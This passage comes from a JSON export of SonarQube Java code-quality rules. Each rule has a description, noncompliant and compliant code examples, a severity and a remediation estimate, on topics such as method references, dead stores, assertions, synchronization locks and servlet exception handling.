            "mdDesc": "<p>Method/constructor references are commonly agreed to be, most of the time, more compact and readable than using lambdas, and are therefore\npreferred. </p>\n<p>In some rare cases, when it is not clear from the context what kind of function is being described and reference would not increase the clarity, it\nmight be fine to keep the lambda. </p>\n<p>Similarly, <code>null</code> checks can be replaced with references to the <code>Objects::isNull</code> and <code>Objects::nonNull</code>\nmethods.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass A {\n  void process(List&lt;A&gt; list) {\n    list.stream()\n      .map(a -&gt; a.&lt;String&gt;getObject())\n      .forEach(a -&gt; { System.out.println(a); });\n  }\n\n  &lt;T&gt; T getObject() {\n    return null;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass A {\n  void process(List&lt;A&gt; list) {\n    list.stream()\n      .map(A::&lt;String&gt;getObject)\n      .forEach(System.out::println);\n  }\n\n  &lt;T&gt; T getObject() {\n    return null;\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1858",
            "repo": "java",
            "name": "\"toString()\" should never be called on a String object",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Invoking a method designed to return a string representation of an object which is already a string is a waste of keystrokes. This redundant\nconstruction may be optimized by the compiler, but will be confusing in the meantime.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString message = \"hello world\";\nSystem.out.println(message.toString()); // Noncompliant;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString message = \"hello world\";\nSystem.out.println(message);\n</pre>",
            "mdDesc": "<p>Invoking a method designed to return a string representation of an object which is already a string is a waste of keystrokes. This redundant\nconstruction may be optimized by the compiler, but will be confusing in the meantime.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString message = \"hello world\";\nSystem.out.println(message.toString()); // Noncompliant;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString message = \"hello world\";\nSystem.out.println(message);\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "finding"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1854",
            "repo": "java",
            "name": "Unused assignments should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value\nonly to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.\nTherefore all calculated values should be used.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ni = a + b; // Noncompliant; calculation result not used before value is overwritten\ni = compute();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ni = a + b;\ni += compute();\n</pre>\n<h2>Exceptions</h2>\n<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>true</code>, <code>false</code> and <code>\"\"</code>.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/563.html\">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/39UxBQ\">CERT, MSC13-C.</a> - Detect and remove unused values </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/9DZGBQ\">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>\n</ul>",
            "mdDesc": "<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value\nonly to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.\nTherefore all calculated values should be used.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ni = a + b; // Noncompliant; calculation result not used before value is overwritten\ni = compute();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ni = a + b;\ni += compute();\n</pre>\n<h2>Exceptions</h2>\n<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>true</code>, <code>false</code> and <code>\"\"</code>.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/563.html\">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/39UxBQ\">CERT, MSC13-C.</a> - Detect and remove unused values </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/9DZGBQ\">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2701",
            "repo": "java",
            "name": "Literal boolean values and nulls should not be used in assertions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There's no reason to use literal boolean values or nulls in assertions. Instead of using them with <em>assertEquals</em>, <em>assertNotEquals</em>\nand similar methods, you should be using <em>assertTrue</em>, <em>assertFalse</em>, <em>assertNull</em> or <em>assertNotNull</em> instead (or\n<em>isNull</em> etc. when using Fest). Using them with assertions unrelated to equality (such as <em>assertNull</em>) is most likely a bug.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit3 </li>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> Fest assert </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nAssert.assertTrue(true);  // Noncompliant\nassertThat(null).isNull(); // Noncompliant\n\nassertEquals(true, something()); // Noncompliant\nassertNotEquals(null, something()); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertTrue(something());\nassertNotNull(something());\n</pre>",
            "mdDesc": "<p>There's no reason to use literal boolean values or nulls in assertions. Instead of using them with <em>assertEquals</em>, <em>assertNotEquals</em>\nand similar methods, you should be using <em>assertTrue</em>, <em>assertFalse</em>, <em>assertNull</em> or <em>assertNotNull</em> instead (or\n<em>isNull</em> etc. when using Fest). Using them with assertions unrelated to equality (such as <em>assertNull</em>) is most likely a bug.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit3 </li>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> Fest assert </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nAssert.assertTrue(true);  // Noncompliant\nassertThat(null).isNull(); // Noncompliant\n\nassertEquals(true, something()); // Noncompliant\nassertNotEquals(null, something()); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertTrue(something());\nassertNotNull(something());\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1609",
            "repo": "java",
            "name": "@FunctionalInterface annotation should be used to flag Single Abstract Method interfaces",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A Single Abstract Method (SAM) interface is a Java interface containing only one method. The Java API is full of SAM interfaces, such as\n<code>java.lang.Runnable</code>, <code>java.awt.event.ActionListener</code>, <code>java.util.Comparator</code> and\n<code>java.util.concurrent.Callable</code>. SAM interfaces have a special place in Java 8 because they can be implemented using Lambda expressions or\nMethod references. </p>\n<p>Using <code>@FunctionalInterface</code> forces a compile break when an additional, non-overriding abstract method is added to a SAM, which would\nbreak the use of Lambda implementations.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface Changeable&lt;T&gt; {\n  public void change(T o);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@FunctionalInterface\npublic interface Changeable&lt;T&gt; {\n  public void change(T o);\n}\n</pre>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>A Single Abstract Method (SAM) interface is a Java interface containing only one method. The Java API is full of SAM interfaces, such as\n<code>java.lang.Runnable</code>, <code>java.awt.event.ActionListener</code>, <code>java.util.Comparator</code> and\n<code>java.util.concurrent.Callable</code>. SAM interfaces have a special place in Java 8 because they can be implemented using Lambda expressions or\nMethod references. </p>\n<p>Using <code>@FunctionalInterface</code> forces a compile break when an additional, non-overriding abstract method is added to a SAM, which would\nbreak the use of Lambda implementations.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface Changeable&lt;T&gt; {\n  public void change(T o);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@FunctionalInterface\npublic interface Changeable&lt;T&gt; {\n  public void change(T o);\n}\n</pre>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1611",
            "repo": "java",
            "name": "Parentheses should be removed from a single lambda input parameter when its type is inferred",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There are two possible syntaxes for a lambda having only one input parameter with an inferred type: with and without parentheses around that single\nparameter. The simpler syntax, without parentheses, is more compact and readable than the one with parentheses, and is therefore preferred.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n(x) -&gt; x * 2\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nx -&gt; x * 2\n</pre>",
            "mdDesc": "<p>There are two possible syntaxes for a lambda having only one input parameter with an inferred type: with and without parentheses around that single\nparameter. The simpler syntax, without parentheses, is more compact and readable than the one with parentheses, and is therefore preferred.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n(x) -&gt; x * 2\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nx -&gt; x * 2\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1862",
            "repo": "java",
            "name": "Related \"if/else if\" statements should not have the same condition",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first\none with a condition that evaluates to <code>true</code>. </p>\n<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and\nat worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 1)  // Noncompliant\n  moveWindowToTheBackground();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 3)\n  moveWindowToTheBackground();\n}\n\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>",
            "mdDesc": "<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first\none with a condition that evaluates to <code>true</code>. </p>\n<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and\nat worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 1)  // Noncompliant\n  moveWindowToTheBackground();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 3)\n  moveWindowToTheBackground();\n}\n\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "pitfall",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S6068",
            "repo": "java",
            "name": "Call to Mockito method \"verify\", \"when\" or \"given\" should be simplified",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Mockito provides <em>argument matchers</em> for flexibly stubbing or verifying method calls.</p>\n<p><code>Mockito.verify()</code>, <code>Mockito.when()</code>, <code>Stubber.when()</code> and <code>BDDMockito.given()</code> each have overloads\nwith and without argument matchers.</p>\n<p>However, the default matching behavior (i.e. without argument matchers) uses <code>equals()</code>. If only the matcher\n<code>org.mockito.ArgumentMatchers.eq()</code> is used, the call is equivalent to the call without matchers, i.e. the <code>eq()</code> is not\nnecessary and can be omitted. The resulting code is shorter and easier to read.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void myTest() {\n  given(foo.bar(eq(v1), eq(v2), eq(v3))).willReturn(null);   // Noncompliant\n  when(foo.baz(eq(v4), eq(v5))).thenReturn(\"foo\");   // Noncompliant\n  doThrow(new RuntimeException()).when(foo).quux(eq(42));    // Noncompliant\n  verify(foo).bar(eq(v1), eq(v2), eq(v3));   // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void myTest() {\n  given(foo.bar(v1, v2, v3)).willReturn(null);\n  when(foo.baz(v4, v5)).thenReturn(\"foo\");\n  doThrow(new RuntimeException()).when(foo).quux(42);\n  verify(foo).bar(v1, v2, v3);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#argument_matchers\">Mockito documentation</a> -\n  argument matchers </li>\n  <li> <a href='/coding_rules#rule_key=java%3AS6073'>S6073</a> - Mockito argument matchers should be used on all parameters </li>\n</ul>",
            "mdDesc": "<p>Mockito provides <em>argument matchers</em> for flexibly stubbing or verifying method calls.</p>\n<p><code>Mockito.verify()</code>, <code>Mockito.when()</code>, <code>Stubber.when()</code> and <code>BDDMockito.given()</code> each have overloads\nwith and without argument matchers.</p>\n<p>However, the default matching behavior (i.e. without argument matchers) uses <code>equals()</code>. If only the matcher\n<code>org.mockito.ArgumentMatchers.eq()</code> is used, the call is equivalent to the call without matchers, i.e. the <code>eq()</code> is not\nnecessary and can be omitted. The resulting code is shorter and easier to read.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void myTest() {\n  given(foo.bar(eq(v1), eq(v2), eq(v3))).willReturn(null);   // Noncompliant\n  when(foo.baz(eq(v4), eq(v5))).thenReturn(\"foo\");   // Noncompliant\n  doThrow(new RuntimeException()).when(foo).quux(eq(42));    // Noncompliant\n  verify(foo).bar(eq(v1), eq(v2), eq(v3));   // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void myTest() {\n  given(foo.bar(v1, v2, v3)).willReturn(null);\n  when(foo.baz(v4, v5)).thenReturn(\"foo\");\n  doThrow(new RuntimeException()).when(foo).quux(42);\n  verify(foo).bar(v1, v2, v3);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://javadoc.io/doc/org.mockito/mockito-core/latest/org/mockito/Mockito.html#argument_matchers\">Mockito documentation</a> -\n  argument matchers </li>\n  <li> {rule:java:S6073} - Mockito argument matchers should be used on all parameters </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "mockito",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1860",
            "repo": "java",
            "name": "Synchronization should not be done on instances of value-based classes",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Objects which are pooled and potentially reused should not be used for synchronization. If they are, it can cause unrelated threads to deadlock\nwith unhelpful stacktraces. Specifically, <code>String</code> literals, and boxed primitives such as Integers should not be used as lock objects\nbecause they are pooled and reused. The story is even worse for <code>Boolean</code> objects, because there could possibly be only two instances of\n<code>Boolean</code>, <code>Boolean.TRUE</code> and <code>Boolean.FALSE</code> and every class that uses a Boolean will be referring to one of the\ntwo.</p>\n<p>Here is the list of types which shouldn't be used for synchronization:</p>\n<ul>\n  <li> The primitive wrapper classes in java.lang; </li>\n  <li> The class java.lang.Runtime.Version; </li>\n  <li> The \"optional\" classes in java.util: Optional, OptionalInt, OptionalLong, and OptionalDouble; </li>\n  <li> Many classes in the java.time API: Instant, LocalDate, LocalTime, LocalDateTime, ZonedDateTime, ZoneId, OffsetTime, OffsetDateTime, ZoneOffset,\n  Duration, Period, Year, YearMonth, and MonthDay, and, in java.time.chrono: MinguoDate, HijrahDate, JapaneseDate, and ThaiBuddhistDate; </li>\n  <li> The interface java.lang.ProcessHandle and its implementation classes; </li>\n  <li> The implementation classes of the collection factories in java.util: List.of, List.copyOf, Set.of, Set.copyOf, Map.of, Map.copyOf,\n  Map.ofEntries, and Map.entry. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate static final Boolean bLock = Boolean.FALSE;\nprivate static final Integer iLock = Integer.valueOf(0);\nprivate static final String sLock = \"LOCK\";\nprivate static final List&lt;String&gt; listLock = List.of(\"a\", \"b\", \"c\", \"d\");\n\npublic void doSomething() {\n\n  synchronized(bLock) {  // Noncompliant\n    // ...\n  }\n  synchronized(iLock) {  // Noncompliant\n    // ...\n  }\n  synchronized(sLock) {  // Noncompliant\n    // ...\n  }\n  synchronized(listLock) {  // Noncompliant\n    // ...\n  }\n\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate static final Object lock1 = new Object();\nprivate static final Object lock2 = new Object();\nprivate static final Object lock3 = new Object();\nprivate static final Object lock4 = new Object();\n\npublic void doSomething() {\n\n  synchronized(lock1) {\n    // ...\n  }\n  synchronized(lock2) {\n    // ...\n  }\n  synchronized(lock3) {\n    // ...\n  }\n  synchronized(lock4) {\n    // ...\n  }\n</pre>\n<h2>See</h2>\n<p> * <a href=\"https://wiki.sei.cmu.edu/confluence/x/1zdGBQ\">CERT, LCK01-J.</a> - Do not synchronize on objects that may be reused</p>\n<p> * <a href=\"https://openjdk.java.net/jeps/390\">JEP-390.</a> - JEP 390: Warnings for Value-Based Classes</p>",
            "mdDesc": "<p>Objects which are pooled and potentially reused should not be used for synchronization. If they are, it can cause unrelated threads to deadlock\nwith unhelpful stacktraces. Specifically, <code>String</code> literals, and boxed primitives such as Integers should not be used as lock objects\nbecause they are pooled and reused. The story is even worse for <code>Boolean</code> objects, because there could possibly be only two instances of\n<code>Boolean</code>, <code>Boolean.TRUE</code> and <code>Boolean.FALSE</code> and every class that uses a Boolean will be referring to one of the\ntwo.</p>\n<p>Here is the list of types which shouldn't be used for synchronization:</p>\n<ul>\n  <li> The primitive wrapper classes in java.lang; </li>\n  <li> The class java.lang.Runtime.Version; </li>\n  <li> The \"optional\" classes in java.util: Optional, OptionalInt, OptionalLong, and OptionalDouble; </li>\n  <li> Many classes in the java.time API: Instant, LocalDate, LocalTime, LocalDateTime, ZonedDateTime, ZoneId, OffsetTime, OffsetDateTime, ZoneOffset,\n  Duration, Period, Year, YearMonth, and MonthDay, and, in java.time.chrono: MinguoDate, HijrahDate, JapaneseDate, and ThaiBuddhistDate; </li>\n  <li> The interface java.lang.ProcessHandle and its implementation classes; </li>\n  <li> The implementation classes of the collection factories in java.util: List.of, List.copyOf, Set.of, Set.copyOf, Map.of, Map.copyOf,\n  Map.ofEntries, and Map.entry. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate static final Boolean bLock = Boolean.FALSE;\nprivate static final Integer iLock = Integer.valueOf(0);\nprivate static final String sLock = \"LOCK\";\nprivate static final List&lt;String&gt; listLock = List.of(\"a\", \"b\", \"c\", \"d\");\n\npublic void doSomething() {\n\n  synchronized(bLock) {  // Noncompliant\n    // ...\n  }\n  synchronized(iLock) {  // Noncompliant\n    // ...\n  }\n  synchronized(sLock) {  // Noncompliant\n    // ...\n  }\n  synchronized(listLock) {  // Noncompliant\n    // ...\n  }\n\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate static final Object lock1 = new Object();\nprivate static final Object lock2 = new Object();\nprivate static final Object lock3 = new Object();\nprivate static final Object lock4 = new Object();\n\npublic void doSomething() {\n\n  synchronized(lock1) {\n    // ...\n  }\n  synchronized(lock2) {\n    // ...\n  }\n  synchronized(lock3) {\n    // ...\n  }\n  synchronized(lock4) {\n    // ...\n  }\n</pre>\n<h2>See</h2>\n<p> * <a href=\"https://wiki.sei.cmu.edu/confluence/x/1zdGBQ\">CERT, LCK01-J.</a> - Do not synchronize on objects that may be reused</p>\n<p> * <a href=\"https://openjdk.java.net/jeps/390\">JEP-390.</a> - JEP 390: Warnings for Value-Based Classes</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2959",
            "repo": "java",
            "name": "Unnecessary semicolons should be omitted",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Under the reasoning that cleaner code is better code, the semicolon at the end of a try-with-resources construct should be omitted because it can\nbe omitted.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);  // ignored; this one's required\n      Reader r = new InputStreamReader(b);)   // Noncompliant\n{\n   //do stuff\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);\n      Reader r = new InputStreamReader(b))\n{\n   //do stuff\n}\n</pre>",
            "mdDesc": "<p>Under the reasoning that cleaner code is better code, the semicolon at the end of a try-with-resources construct should be omitted because it can\nbe omitted.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ntry (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);  // ignored; this one's required\n      Reader r = new InputStreamReader(b);)   // Noncompliant\n{\n   //do stuff\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ntry (ByteArrayInputStream b = new ByteArrayInputStream(new byte[10]);\n      Reader r = new InputStreamReader(b))\n{\n   //do stuff\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1989",
            "repo": "java",
            "name": "Exceptions should not be thrown from servlet methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Even though the signatures for methods in a servlet include <code>throws IOException, ServletException</code>, it's a bad idea to let such\nexceptions be thrown. Failure to catch exceptions in a servlet could leave a system in a vulnerable state, possibly resulting in denial-of-service\nattacks, or the exposure of sensitive information because when a servlet throws an exception, the servlet container typically sends debugging\ninformation back to the user. And that information could be very valuable to an attacker. </p>\n<p>This rule checks all exceptions in methods named \"do*\" are explicitly handled in servlet classes.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws IOException, ServletException {\n  String ip = request.getRemoteAddr();\n  InetAddress addr = InetAddress.getByName(ip); // Noncompliant; getByName(String) throws UnknownHostException\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws IOException, ServletException {\n  try {\n    String ip = request.getRemoteAddr();\n    InetAddress addr = InetAddress.getByName(ip);\n    //...\n  }\n  catch (UnknownHostException uhex) {\n    //...\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/600.html\">MITRE, CWE-600</a> - Uncaught Exception in Servlet </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/-zZGBQ\">CERT, ERR01-J.</a> - Do not allow exceptions to expose sensitive information </li>\n</ul>",
